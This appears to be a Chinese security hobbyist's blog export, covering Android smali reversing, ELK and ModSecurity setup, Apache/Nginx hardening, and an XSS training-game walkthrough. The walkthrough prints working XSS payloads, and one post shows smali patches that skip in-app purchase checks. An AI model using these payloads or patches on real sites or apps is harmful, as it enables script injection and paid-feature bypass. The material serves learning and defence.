{"meta":{"title":"Misaki's Blog","subtitle":null,"description":"One way to choose one","author":"Misaki","url":""},"pages":[{"title":"Me","date":"2018-09-18T03:14:22.000Z","updated":"2019-01-30T08:08:54.381Z","comments":true,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"关于我Web安全爱好者，python级菜鸟，移动安全进行中，喜欢一些新事物，成功性随机。"},{"title":"资料收集","date":"2018-09-20T03:19:11.000Z","updated":"2019-01-30T08:55:14.217Z","comments":true,"path":"data/index.html","permalink":"/data/index.html","excerpt":"","text":"SSRF SSRF漏洞的利用与学习 SSRF攻击实例解析 SSRF漏洞的挖掘经验 XXE XML实体注入漏洞攻与防 浅谈XXE漏洞攻击与防御 Java XXE Vulnerability SSTI 服务端模板注入攻击 Python 模板字符串与模板注入 Exploring SSTI in Flask/Jinja2 XSS 再谈同源策略 跨站的艺术 Browser’s XSS Filter Bypass Cheat Sheet XSS Filter Evasion Cheat Sheet 中文版 SQL SQL注入总结 MSSQL 注入攻击与防御 SQL注入测试技巧TIP 逻辑漏洞 Web安全测试中常见逻辑漏洞解析 未授权访问漏洞的检测与利用 任意用户密码重置（一）：重置凭证泄漏 任意用户密码重置（二）：重置凭证接收端可篡改 任意用户密码重置（三）：用户混淆 任意用户密码重置（四）：重置凭证未校验 任意用户密码重置（五）：重置凭证可暴破 任意用户密码重置（六）：应答中存在影响后续逻辑的状态参数 任意用户密码重置（七）：Token可预测 Web安全测试学习手册-业务逻辑测试 二维码登陆的常见缺陷剖析 渗透测试 Web渗透测试笔记 记一次对某企业的渗透测试实战 渗透测试工具备忘录 API 接口渗透测试 cobalt strike 快速上手 ThinkPHP-漏洞分析集合 RirchFaces反序列化漏洞 系统入侵与远程控制 内网渗透 内网渗透中转发工具总结 Cobalt strike在内网渗透中的使用 windows内网渗透杂谈 Linux 下多种反弹 shell 方法 穿越边界的姿势 Linux内网渗透"}],"posts":[{"title":"Android Studio 动态调试","slug":"Android-Studio-动态调试","date":"2019-01-29T08:47:40.000Z","updated":"2019-01-29T08:49:57.551Z","comments":true,"path":"2019/01/Android-Studio-动态调试/","link":"","permalink":"/2019/01/Android-Studio-动态调试/","excerpt":"","text":"Android Studio 动态调试调试仍然使用我们喜闻乐见的Android Studio，不过使用的是AS3，AS在3.0版本后便不在使用DDMS，调试smali上有点不适应，不过我们仍然可以在配置SDK后，在命令行输入“monitor”来打开DDMS。 apk使用我们自己生成的一个简单的登陆判断界面来做测试。 使用网上的一段登陆代码如下 生成APK后，利用AK反编译为smali代码。 然后用AS打开反编译后的文件夹，当然在利用AS调试smali的时候，需要安装ideasmali插件，具体可以百度插件名即可下载。 调试的时候需要我们进行端口的转发，可以先用DDMS查看一下端口是否是8700（一般默认为8700），因为启动AS后会占有相应的端口，导致无法打开DDMS。 具体使用方式为：打开DDMS。在CMD命令行输入以下内容，其中package为包名。MainActivity是需要调试的activity名，具体看情况修改。 adb shell am start -D -n package/.MainActivity 可以看到手机端或者模拟器端已经以调试的方式启动我们相应的程序了。在DDMS中就可以看到一只红色的小蜘蛛了。后面有一个端口默认应该是8700。然后查看进程PID，假设为1980。 adb forward tcp:8700 jdwp:1980 进行端口转发到。转发的时候要先关闭DDMS，不然显示端口被占用。 在使用AS打开我们需要的文件后，如以下内容。 配置远程调试参数，修改端口为8700. 然后在需要的地方设置断点，此处在账户密码的判断处下断点。启动调试，然后就可以看到界面显示到我们断点前的地方了。在模拟器上输入账号密码后，就可以看到断点被执行。 可以看到下面两部分第一部分为为v0赋值为admin，调用String类的equals方法来判断v0参数和p1对象值是否相同，并把结果赋值给v0，一个布尔值。第二部分，判断v0是否为0，等于0跳转到:cond_0处。不等于0则继续，同样为v0赋值一个字符串为12345，调用方法判断是否相同，以下则和上面基本一致。 此时，需要做些什么修改，判断，以后参数变化，可以在下面的variables查看，上图中的参数就是在模拟器中输入的参数显示。","categories":[],"tags":[{"name":"移动安全","slug":"移动安全","permalink":"/tags/移动安全/"}]},{"title":"Android逆向逻辑修改入门","slug":"Android逆向逻辑修改入门","date":"2019-01-28T08:28:34.000Z","updated":"2019-01-29T06:49:42.179Z","comments":true,"path":"2019/01/Android逆向逻辑修改入门/","link":"","permalink":"/2019/01/Android逆向逻辑修改入门/","excerpt":"","text":"Android 逻辑判断修改使用AS创建一个工程，利用生成工程的初始代码来做。 创建新的layout，在mainactivity中添加新的layout标识。在显示界面的时候加一个判断逻辑，完成后类似如下 if(a==1) { setContentView(R.layout.activity_main); } else setContentView(R.layout.activity_main2); } 于是乎，当a为1的时候显示activity_main界面字段。不为1显示activity_main2字段。 一般情况下，对于有些需要内购，或者某些情况才给你显示的界面的时候，界面不是从后端返回而是返回json参数由前端接收显示的时候，可以从前端修改逻辑来绕过判断。 生成smali代码，其中主要部分为下： .method protected onCreate(Landroid/os/Bundle;)V .registers 4 .param p1, &quot;savedInstanceState&quot; # Landroid/os/Bundle; .prologue .line 17 invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;-&gt;onCreate(Landroid/os/Bundle;)V .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 if-ne v0, v1, :cond_e .line 20 const v1, 0x7f09001c invoke-virtual {p0, v1}, Lcom/example/user/application/MainActivity;-&gt;setContentView(I)V .line 24 :goto_d return-void .line 23 :cond_e const v1, 0x7f09001d invoke-virtual {p0, v1}, Lcom/example/user/application/MainActivity;-&gt;setContentView(I)V goto :goto_d .end method 整体的代码相当简单轻松，来看判断代码处。 .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 if-ne v0, v1, :cond_e 其中if-ne，逻辑显示v0不等于v1，跳转到cond_e标签处。 修改一：直接修改if-ne判断形式，修改为if-eq，这样只要不完成正常的逻辑操作，都会跳转到我们想看的界面。 修改二：由于判断处是根据参数a的值和1做对比，所以我们直接对a重赋值(以上的a赋值可以粗略的看为是请求获取的值)。 .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 const/4 v0, 0x1 if-ne v0, v1, :cond_e 修改三：利用强制跳转，在需要去查看，或者执行下去的地方添加标签，goto_1，然后在判断执行前强制跳转进去。 const/4 v1, 0x1 goto :goto_1 if-ne v0, v1, :cond_0 .line 20 :goto_1 const v1, 0x7f09001c","categories":[],"tags":[{"name":"移动安全","slug":"移动安全","permalink":"/tags/移动安全/"}]},{"title":"Android 逆向Smali语言初识","slug":"Android-逆向Smali语言初识","date":"2019-01-22T07:55:56.000Z","updated":"2019-01-22T07:58:12.807Z","comments":true,"path":"2019/01/Android-逆向Smali语言初识/","link":"","permalink":"/2019/01/Android-逆向Smali语言初识/","excerpt":"","text":"Android 逆向Smali语言初识​ Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。 函数语法​ Smali 语法规范与格式Smali 是对 Dalvik 虚拟机字节码的一种解释，虽然不是官方标准语言，但所有语句都遵循一套语法规范。要了解 smali 语法规范，可以先从了解 Dalvik 虚拟机字节码的指令格式开始。3.1 Dalvik 虚拟机字节码指令格式在 Android 4.0 源码 Dalvik/docs 目录下提供了一份文档 instruction-formats.html，里面详细列举了 Dalvik 虚拟机字节码指令的所有格式。 Dalvik 虚拟机字节码的类型、方法和字段的表示方法3.2.1 类型Dalvik 字节码有两种类型，基本类型和引用类型。对象和数组是引用类型，其它都是基本类型。 Dalvik 字节码类型描述符 ​ 描述符 类型 V void，只能用于返回值类型 Z boolean B byte S short C charI intJ long（64 位） F floatD double（64 位） L Java 类类型 [ 数组类型 常见的代码含义： #表示当前代码在源java文件中的行数。 .line .line 34 #表示来自公共方法methodAReturn返回值是一个对象com.bolex.AA method .method public methodAReturn(Lcom/bolex/AA;Lcom/bolex/AA;)Lcom/bolex/AA; #表示该函数上需要使用3个寄存器 registers .registers 3 #表示接收两个入参都是AA对象，并标记寄存器p1和p2 param .param p1, &quot;mAA&quot; # Lcom/bolex/AA; .param p2, &quot;sAA&quot; # Lcom/bolex/AA; #表示函数内执行的起始标记 .prologue .prologue #表示 返回寄存器上p1对象 return-object return-object p1 #表示函数结束标记 .end method #创建一个AA对象 new-instance new-instance v0, Lcom/bolex/AA; #表示使用无参构造方法直接调用 invoke-direct invoke-direct {v0}, Lcom/bolex/AA;-&gt;&lt;init&gt;()V #表示为虚拟方法 invoke-virtual #数组操作指令 #new-array构造指定类型I也就是int类型并且把值赋给v0 # v0=new int[8]; new-array v0,v0,[ I #array-length 获取给定v0寄存器中数组的长度并将值赋给v1寄存器，数组长度就是数组的个数。v1=v0,也就是说v1=8 array-length v1,v0 # 方法调用指令 #new-instance v1,... 构造一个指定类型对象的新实例，并将对象引用赋值给v1寄存器。 #L表示java类型中的任何类， # StringBuilder对象是动态对象，允许扩充它所封装的字符串中字符的数量，但是您可以为它可容纳的最大字符数指定一个值。相当于是一个string的升级版。 new-instance v1,Ljava/lang/StringBuilder; # 方法调用指令 #&lt;init&gt;:在实例创建出来的时候调用，包括调用new操作符； new-direct v1,Ljava/lang/StringBuilder;-&gt;&lt;init&gt;( )v # 跳转指令 if (v0!=0) #if-nez 的意思就是 not equal zero 如果v0不等于0，那么就继续向下执行，如果等于0就跳转到标号名为cond_0的位置。 if-nez v0, : cond_0 # goto的含义就是强行跳转到标号名为goto_0的地方 goto :goto_0 #标号cond_0 ：cond_0 # 数据转换指令 #把int型变量转变为float变量 int-to-float v2,v2 # 数据运算指令 # 相当于 v2+=v2，第一个v2是寄存器，第二个和第三个是数据 add-float v2,v2,v2 Java编译dex文件以下用常见的hello world来表示smali语法结构。 public class firedt { public static void main(String[] args){ System.out.println(&quot;hello world&quot;); } } 在AS中打开代码，安装java2smali插件后，在build-&gt;compile to smali编译为smali代码。 编译完成后的代码为以下，并对关键代码进行注释含义： .class public Lfiredt; #定义一个firedt类 .super Ljava/lang/Object; #继承object类 .source &quot;firedt.java&quot; #由firedt.java编译来 # direct methods .method public constructor &lt;init&gt;()V .registers 1 #注册一个寄存器 .prologue #代码开始 .line 1 #第一行 invoke-direct {p0}, Ljava/lang/Object;-&gt;&lt;init&gt;()V return-void .end method .method public static main([Ljava/lang/String;)V #说明一个main的静态方法，类型为void .registers 3 .prologue .line 3 sget-object v0, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream; #获取变量对象保存到v0 const-string v1, &quot;hello world&quot; #赋值一个字符串v1=hello world invoke-virtual {v0, v1}, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V #调用printstream的println方法把v0赋值v1 .line 4 return-void .end method #方法结束，一个method对应一个end method 参考资料： smali语法中文参考文档 逆向之Smali入门学习","categories":[],"tags":[{"name":"移动安全","slug":"移动安全","permalink":"/tags/移动安全/"}]},{"title":"ELK搭建使用","slug":"ELK搭建使用","date":"2018-11-04T09:05:12.000Z","updated":"2018-11-04T09:34:33.734Z","comments":true,"path":"2018/11/ELK搭建使用/","link":"","permalink":"/2018/11/ELK搭建使用/","excerpt":"","text":"ELK日志分析系统搭建使用ELK是三个开源软件的缩写，分别表示：Elasticsearch , Logstash, Kibana , 它们都是开源软件。但现在新增了一个FileBeat，它是一个轻量级的日志收集处理工具(Agent)，Filebeat占用资源少，适合于在各个服务器上搜集日志后传输给Logstash，但此次并不添加filebeat，仍然以es、logstash、kibana做搭建使用。 使用环境：centos6.5 192.168.253.138作为日志来源服务器 apache ​ centos7 192.168.253.139 作为显示终端服务器 安装jdk首先安装Java，版本1.8以上。 安装Elasticsearch下载elasticsearch ， wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.4.2.tar.gz 修改解压文件中的config/elasticsearch.yml 文件 # 这里指定的是集群名称，需要修改为对应的，开启了自发现功能后，ES会按照此集群名称进行集群发现 cluster.name: es_cluster node.name: es_cluster_1 # 数据目录 path.data: /data/data # log 目录 path.logs: /data/logs # 修改一下ES的监听地址，这样别的机器也可以访问 network.host: 192.168.253.139 # 默认的端口号 http.port: 9200 discovery.zen.ping.unicast.hosts: [&quot;192.168.253.138&quot;, &quot;192.168.253.139&quot;] 在使用中可能会因为系统内存等问题导致启动失败，所以可以预调整系统参数。 设置内核参数 vi /etc/sysctl.conf # 增加以下参数 vm.max_map_count=655360 执行以下命令，确保生效配置生效： sysctl -p 设置资源参数 vi /etc/security/limits.conf # 修改 * soft nofile 65536 * hard nofile 131072 * soft nproc 65536 * hard nproc 131072 设置用户资源参数 vi /etc/security/limits.d/20-nproc.conf # 设置elk用户参数 elk soft nproc 65536 启动elk需要非root用户，所以创建elk用户。 useradd elk #创建用户elk groupadd elk #创建组elk useradd elk -g elk #将用户添加到组 mkdir -pv /data/{data,logs} # 创建数据和日志目录 # 修改文件所有者 chown -R elk:elk /data/ chown -R elk:elk /etc/elasticsearch/ 切换到elk用户，启动服务 启动文件 /etc/elasticsearch/bin/elasticsearch 服务器要关闭防火墙 systemctl stop firewalld.service 这时候可以看到log输出，节点正常启动. 用浏览器访问，同时可以正常使用 安装Logstash下载解压 wget https://artifacts.elastic.co/downloads/logstash/logstash-6.4.2.tar.gz 在解压后目录执行 /usr/share/logstash/bin/logstash -e &#39;input { stdin { } } output { stdout {} }&#39; 在命令行输入什么内容讲原样输出，比如： 显示正常以后再去修改配置文件，需要自己添加，创建如下内容文件。 cat logstash-simple.conf input{ file { path =&gt; &quot;/var/log/httpd/*&quot; start_position =&gt; beginning } } output { stdout { codec=&gt; rubydebug } elasticsearch { hosts =&gt; &quot;192.168.253.132:9200&quot; protocol =&gt; &quot;http&quot; index =&gt; &quot;logstash-%{+YYYY-MM}&quot; } } 开启服务，执行如下命令： /usr/share/logstash/bin/logstash -f /usr/share/logstash/config/logstash-simple.conf 我们可以查看 ES 是否接收到了数据： Kibana的安装wget https://artifacts.elastic.co/downloads/kibana/kibana-6.4.2-linux-x86_64.tar.gz 编辑kibana.yml配置文件 vi /usr/share/kibana/config/kibana.yml 修改以下参数： server.port: 5601 #开启默认端口5601，本文修改默认端口为5602 server.host: “192.168.253.139” #站点地址 elasticsearch.url: http://192.168.253.139:9200 #指向elasticsearch服务的ip地址 kibana.index: “.kibana” 启动 执行以下命令启动： /usr/share/kibana/bin/kibana 测试浏览器访问 访问：http://192.168.253.139:5602 正常启动后，需要配置索引，设置logstash-* ，添加索引和Available fields后，点击Discover就可以看到logstash传输过来的日志信息。 然后可以手动添加fields参数或者创建图表。 yum 安装以上安装方式为下载配置安装，可以使用yum安装。 # 导入私钥 rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch # 添加yum源 vim /etc/yum.repos.d/es.repo yum源内容： [elasticsearch-6.x] name=Elasticsearch repository for 6.x packages baseurl=https://artifacts.elastic.co/packages/6.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md 执行安装： # 安装java + ELK yum install java-1.8.0-openjdk.x86_64 elasticsearch.noarch kibana.x86_64 logstash.noarch -y # 修改配置文件 vi /etc/logstash/logstash.yml vi /etc/elasticsearch/elasticsearch.yml vi /etc/kibana/kibana.yml # 启动服务 systemctl start logstash.service elasticsearch.service kibana.service 配置文件和上文相同修改，如若无法访问，关闭防火墙 。 参考链接： https://blog.csdn.net/KingBoyWorld/article/details/78555120 https://www.cnblogs.com/yuhuLin/p/7018858.html https://www.elastic.co/products","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Apache中ModSecurity安装配置","slug":"Apache中ModSecurity安装配置","date":"2018-10-22T07:54:13.000Z","updated":"2018-10-22T10:28:19.050Z","comments":true,"path":"2018/10/Apache中ModSecurity安装配置/","link":"","permalink":"/2018/10/Apache中ModSecurity安装配置/","excerpt":"","text":"环境为centos 6.5 apache2.2 modsecurity2.9.2 安装mod_security的依赖 yum install gcc make httpd-devel libxml2 pcre-devel libxml2-devel curl-devel git 下载最新稳定的mod_security源代码 wget https://www.modsecurity.org/tarball/2.9.2/modsecurity-2.9.2.tar.gz 安装步骤： tar xzf modsecurity-2.9.2.tar.gz cd modsecurity-2.9.2 ./configure make install cp modsecurity.conf-recommended /etc/httpd/conf.d/modsecurity.conf cp unicode.mapping /etc/httpd/conf.d/ 安装完成后调整配置，修改httpd.conf LoadModule security2_module modules/mod_security2.so 如下配置，需要根据目录位置修改，因为modsecurity安装在/etc/httpd目录，配置文件在conf文件，所以不在写入以下配置。 &lt;IfModule security2_module&gt; Include conf.d/modsecurity.conf &lt;/IfModule&gt; 配置完成后下载owasp的规则： cd /etc/httpd git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git 或 wget https://github.com/SpiderLabs/owasp-modsecurity-crs/archive/v3.1.0-rc1.tar.gz mv owasp-modsecurity-crs modsecurity-crs cd modsecurity-crs cp crs-setup.conf.example modsecurity-crs-config.conf 在httpd.conf中修改 Include modsecurity-crs/modsecurity-crs-config.conf Include modsecurity-crs/rules/*.conf 修改完成后重启服务： service httpd restart 完成以后尝试SQL注入攻击，可以看到被拦截的页面。 在apache日志中查看error信息： 从上图可以看到拦截的类型和规则id，还有规则的目录文件。去对应的规则处查看规则文件，可以看到如下的规则匹配。 关于modsecurity的配置，根据各自设置的地址，比如当前地址为/etc/httpd/conf.d中。 SecRuleEngine On 设置为mod是否开启，默认设置为Detection Only，作用是只检测。Off则是关闭mod。 SecRequestBodyAccess On 检查请求体，默认开启，可以选择On或Off。 SecAuditEngine RelevantOnlySecAuditLogRelevantStatus “^(?:5|4(?!04))” SecAuditLogParts ABIJDEFHZ SecAuditLogType SerialSecAuditLog /var/log/modsec_audit.log 记录日志审计内容，文件地址等，如下图所示，ABCE等，修改SecAuditLogParts参数，可以记录不同的日志部分。对调试waf，修改配置策略很有用。 然后，如果需要修改其他配置项，比如403错误页面，直接再httpd.conf中修改403错误页面即可。 参考链接： http://www.vue5.com/centos/23142.html https://www.cnblogs.com/xiachj/p/4112194.html","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Apache和Nginx安全配置","slug":"Apache和Nginx安全配置","date":"2018-10-09T08:21:20.000Z","updated":"2018-10-09T14:38:34.712Z","comments":true,"path":"2018/10/Apache和Nginx安全配置/","link":"","permalink":"/2018/10/Apache和Nginx安全配置/","excerpt":"","text":"apache安全配置apache运行原理Apache是基于模块化设计的，它的核心代码并不多，大多数的功能都被分散到各个模块中，各个模块在系统启动的时候按需载入。从配置文件中可以看到加载的各个模块。 apache在启动阶段采用root权限来获取更多的资源使用权限，这个时候会加载配置文件，模块，资源文件等，在下一个运行阶段，Apache为了获得系统资源最大的使用权限，将以特权用户root完成启动。分11个阶段处理用户的请求。 apache的两种工作模式Apache通过MPM(多路处理模块)来使用操作系统的资源，对进程和线程池进行管理。Apache为了能够获得更好的运行性能，针对不同的平台 (Unix/Linux、Window)提供了不同的MPM，用户可以根据实际情况进行选择，其中最常使用的MPM有 prefork和worker两种。 prefork 一个单独的控制进程(父进程)负责产生子进程，这些子进程用于监听请求并作出应答。Apache总是试图保持一些备用的 (spare)或是空闲的子进程用于迎接即将到来的请求。这样客户端就无需在得到服务前等候子进程的产生。在Unix系统中，父进程通常以root身份运行以便邦定80端口，而 Apache产生的子进程通常以一个低特权的用户运行。User和Group指令用于配置子进程的低特权用户。 worker 每个进程能够拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程(父进程)负责子进程的建立。每个子进程能够建立 ThreadsPerChild数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。Apache总是试图维持一个备 用(spare)或是空闲的服务线程池。这样，客户端无须等待新线程或新进程的建立即可得到处理。在Unix中，为了能够绑定80端口，父进程一般都是以 root身份启动，随后，Apache以较低权限的用户建立子进程和线程。User和Group指令用于配置Apache子进程的权限。 apache 在centos下配置apache配置文件，默认文件在/etc/httpd/conf/httpd.conf路径下 那么简单理解一下，配置参数的含义和使用，Allow和Deny可以用于apache的conf文件或者.htaccess文件中（配合Directory, Location, Files等），用来控制目录和文件的访问授权。所以，最常用的是：Order Deny,AllowAllow from All 注意“Deny,Allow”中间只有一个逗号，也只能有一个逗号，有空格都会出错；单词的大小写不限。上面设定的含义是先设定“先检查禁止设定，没有禁止的全部允许”，而第二句没有Deny，也就是没有禁止访问的设定，直接就是允许所有访问了。 但是如果想限制IP访问，如下写 Order Deny,Allow Deny from 192.168.1.1 Allow from all 这时候限制不起作用，Order取规则为最后一个Allow规则，首先限制IP访问，但是会继续查看Allow规定指定的信息，IP又在all中，所以限制不起作用。所以可以如下写： Order Deny,Allow Deny from 192.168.1.1 或者 Order Allow,Deny Allow from all Deny from 192.168.1.1 比如：如下的常用配置 1、在配置文件开始部分和下部有两个配置项，用来隐藏banner信息： ServerTokens OS 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称）ServerSignature On 修改为：ServerSignature Off （不回显apache版本信息） 2、apache在一些系统的默认配置中，开启目录浏览，所以可以使用以下关闭设置。 将Options Indexes FollowSymLinks 改为 Options -Indexes FollowSymLinks 3、取消部分目录的php执行权限 &lt;Directory &quot;/var/www/html/upload&quot;&gt; &lt;FilesMatch &quot;\\.(?i:php|php3|php5)$&quot;&gt; Deny from all &lt;/FilesMatch&gt; &lt;/Directory&gt; //在upload目录下，尽可能多匹配后缀php|php3|php5的文件，不分大小写。 还可以在主机配置文件中增加php_flag engine off指令即可，配置如下： Options FollowSymLinks AllowOverride None Order allow,deny Allow from all php_flag engine off 5、配置httpd.conf限制一些特殊目录的特定ip访问，如内部接口等。 &lt;Directory &quot;/var/www/html/aaa&quot;&gt; Order Deny,Allow Deny from all Allow from 192.168.1.111 &lt;/Directory&gt; 6、配置httpd.conf限制一些文件类型的访问，如txt的日志 &lt;Files ~ &quot;.txt$&quot;&gt; Order allow,deny Deny from all &lt;/Files&gt; 7、针对URL相对路径的禁止访问： &lt;Location /dir/&gt; Order allow,deny Deny from all &lt;/Location&gt; Nginx 安全配置nginx 工作原理Nginx由内核和模块组成，nginx核心模块包括：HTTP模块、EVENT模块和MAIL模块。nginx仅仅通过查找配置文件将客户端请求映射到一个location block（location是Nginx配置中的一个指令，用于URL匹配），而在这个location中所配置的每个指令将会启动不同的模块去完成相应的工作。nginx架构类似于Apache的Worker工作状态，Nginx的每一个Worker进程都管理着大量的线程，真正处理请求的是Worker之下的线程。 nginx本身不能处理PHP，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。nginx一般是把请求发fastcgi管理进程处理，fastcgi管理进程选择cgi子进程处理结果并返回被nginx。 nginx涉及到两个账户，一个是nginx的运行账户，一个是php-fpm的运行账户。如果访问的是一个静态文件，则只需要nginx的运行账户对文件具有读取权限；而如果访问的是一个php文件，则首先需要nginx的运行账户对文件有读取权限，读取到文件后发现是一个php文件，则转发给php-fpm，此时则需要php-fpm账户对文件具有读取权限。 nginx 在centos下的安全配置 nginx设置问题 #隐藏 Nginx 的版本号，提高安全性。 server_tokens off; #开启高效文件传输模式，sendfile 指令指定 Nginx 是否调用sendfile 函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘 IO 重负载应用，可设置为 off，以平衡磁盘与网络 I/O 处理速度，降低系统的负载。 sendfile on; #是否开启目录列表访问，默认关闭。 autoindex off; 开头的配置 user www-data; //用户和组 worker_processes auto; //进程数 pid /run/nginx.pid; //进程文件 include /etc/nginx/modules-enabled/*.conf; //导入其他配置文件到nginx配置文件 events配置 events { worker_connections 768; //设置一个worker进程同时打开的最大连接数 # multi_accept on; //告诉nginx收到一个新连接通知后接受尽可能多的连接 } http配置 http { ## # Basic Settings ## sendfile on; //开启高效文件传输模式 tcp_nopush on; //告诉 Nginx 在一个数据包里发送所有头文件 tcp_nodelay on; //告诉 Nginx 不要缓存数据，而是一段一段的发送 keepalive_timeout 65; //连接超时时间，单位是秒 types_hash_max_size 2048; //上传文件大小限制 # server_tokens off; //隐藏 Nginx 的版本号 # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; //包含配置 default_type application/octet-stream; //默认传输类型 ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; //访问日志 error_log /var/log/nginx/error.log; //错误日志 ## # Gzip Settings ## gzip on; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } server配置 众所周知，Nginx的配置文件分为Server、Location、If等一些配置块，并且存在包含关系，和编程语言比较类似。如果在外层配置的一些选项，是可以被继承到内层的。 但这里的继承也有一些特性，比如add_header，子块中配置后将会覆盖父块中的add_header添加的所有HTTP头，造成一些安全隐患。 server配置在一些系统上不是默认的nginx配置，如果需要修改可以在nginx配置中添加，或者添加include，包含进其他的自定义server。 如下列代码，Server块添加了CSP头： server { ... add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;; add_header X-Frame-Options DENY; location = /test { add_header X-Content-Type-Options nosniff; rewrite ^(.*)$ /xss.html break; } } 但/test的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效。 禁止一个目录的访问示例：禁止访问path目录 location ^~ /path { deny all; } 可以把path换成实际需要的目录，目录path后是否带有”/“，带“/”会禁止访问该目录和该目录下所有文件。不带”/“的情况就有些复杂了，只要目录开头匹配上那个关键字就会禁止；注意要放在fastcgi配置之前。 这个常见于Nginx做反向代理的情况，动态的部分被proxy_pass传递给后端端口，而静态文件需要Nginx来处理。 假设静态文件存储在/home/目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名： location /files { alias /home/; } 此时，访问http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。 但我们注意到，url上/files没有加后缀/，而alias设置的/home/是有后缀/的，这个/就导致我们可以从/home/目录穿越到他的上层目录。从而导致一个目录穿越问题。 禁止php文件的访问及执行 示例：去掉单个目录的PHP执行权限 location ~ /attachments/.*\\.(php|php5)?$ { deny all; } 示例：去掉多个目录的PHP执行权限 location ~ /(attachments|upload)/.*\\.(php|php5)?$ { deny all; } 禁止IP的访问 示例：禁止IP段的写法： deny 10.0.0.0/24; 示例：只允许某个IP或某个IP段用户访问，其它的用户全都禁止 allow x.x.x.x; allow 10.0.0.0/24; deny all; 禁用非必要的方法 if ($request_method !~ ^(GET|HEAD|POST)$ ) { return 444; } 禁用扩展名 location ~* .(txt|doc|sql|gz|svn|git)$ { deny all; } 根据用户的真实 IP 做连接限制 ## 这里取得原始用户的IP地址 map $http_x_forwarded_for $clientRealIp { &quot;&quot; $remote_addr; ~^(?P&lt;firstAddr&gt;[0-9\\.]+),?.*$ $firstAddr; } ## 针对原始用户 IP 地址做限制 limit_conn_zone $clientRealIp zone=TotalConnLimitZone:20m ; limit_conn TotalConnLimitZone 50; limit_conn_log_level notice; ## 针对原始用户 IP 地址做限制 limit_req_zone $clientRealIp zone=ConnLimitZone:20m rate=10r/s; #limit_req zone=ConnLimitZone burst=10 nodelay; limit_req_log_level notice; 参考资料： https://www.cnblogs.com/chenpingzhao/p/5785416.html https://wooyun.kieran.top/#!/drops/201.Nginx%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E7%A0%94%E7%A9%B6 https://wooyun.kieran.top/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE https://blog.csdn.net/yf3585595511/article/details/54933646","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"XSS GAME记录","slug":"XSS-GAME记录","date":"2018-10-05T12:05:20.000Z","updated":"2018-09-30T13:15:41.385Z","comments":true,"path":"2018/10/XSS-GAME记录/","link":"","permalink":"/2018/10/XSS-GAME记录/","excerpt":"","text":"在安全文摘上看到一篇前端安全的文章，最后提到了几个xss在线游戏，有两个是之前就见过的，一个没玩过，好像也是之前的xss游戏。 文章地址：https://segmentfault.com/a/1190000016551188 首先看第一关，此网站需要科学上网。 https://xss-game.appspot.com/level1 页面可以看到所用的html代码和js，以及后端的py代码，简单尝试一下，可以发现是写入页面。 并且从code中可以看到，没有过滤，直接 &lt;script&gt;alert(2)&lt;/script&gt; 第二关，留言框，post提交数据，直接插入图片。 &lt;img src=@ onerror=alert(2)&gt; 第三关，从链接猜测是锚点xss，尝试修改锚点，发现写入页面。 但是尝试后发现，并不是直接写入如上图所示页面那么简单，而是写入了img标签 查看其中的js代码，然后使用如下payload即可。 &#39; onerror=alert(2) &#39; 第四关，点击页面按钮后显示如下，猜测是在timer的xss，查看页面代码。 在timer.html页面下可以发现如下代码，基本可以断定是写入img标签的xss，直接使用onload事件，使用连字符直接alert()。 &#39;-alert(2)-&#39; 第五关，访问后是一个登陆后的页面，这里我们先退出页面。 sign up后可以看到，有输入email的地方，和next两个参数输入点，一开始以为是输入框的问题，尝试多次发现没有写入页面。 然后再signup.html页面下发现如下内容 初步判断是next参数的问题，也就是next写入img标签，尝试如下，必须点击next，一开始点击GO，一直没触发。 javascript:alert(2)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"批量获取数据库权限","slug":"批量获取数据库权限","date":"2018-09-28T02:05:11.000Z","updated":"2018-09-28T10:55:57.503Z","comments":true,"path":"2018/09/批量获取数据库权限/","link":"","permalink":"/2018/09/批量获取数据库权限/","excerpt":"","text":"眼看要到十一国庆小长假了，打算长假前写篇文章，巧合看到一篇老博文，dub ZJ居然要价七千，所以干脆写一个数据库ZJ脚本。 利用以下几点： 